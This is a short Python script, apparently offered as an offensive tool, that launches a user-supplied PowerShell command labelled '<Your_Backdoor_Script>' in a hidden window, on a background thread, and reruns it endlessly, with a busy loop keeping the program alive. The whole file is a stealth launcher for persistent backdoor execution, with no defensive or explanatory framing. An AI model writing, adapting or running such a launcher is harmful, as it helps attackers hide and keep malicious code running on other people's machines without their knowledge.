import subprocess
import threading

def run_powershell_command(command):
    try:
        # Run the PowerShell command and capture the output
        startup_info = subprocess.STARTUPINFO()
        startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = subprocess.SW_HIDE

        while True:
            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, startupinfo=startup_info)

            # Check the return code to see if the command executed successfully
            if result.returncode == 0:
                print(result.stdout.strip())
            else:
                print(f"Error executing PowerShell command:\n{result.stderr.strip()}")

    except FileNotFoundError:
        print("PowerShell command not found. Make sure PowerShell is installed.")

if __name__ == "__main__":
    # Execute in powershell
    powershell_command = '<Your_Backdoor_Script>'

    # Start the PowerShell command in the background
    thread = threading.Thread(target=run_powershell_command, args=(powershell_command,))
    #thread.daemon = True  # This makes the thread a daemon thread, so it will exit when the main program ends
    thread.start()

    # The main program can continue running or exit now.
    # The PowerShell command will run in the background indefinitely.
    while True:
        pass  # You can add any other code here if needed.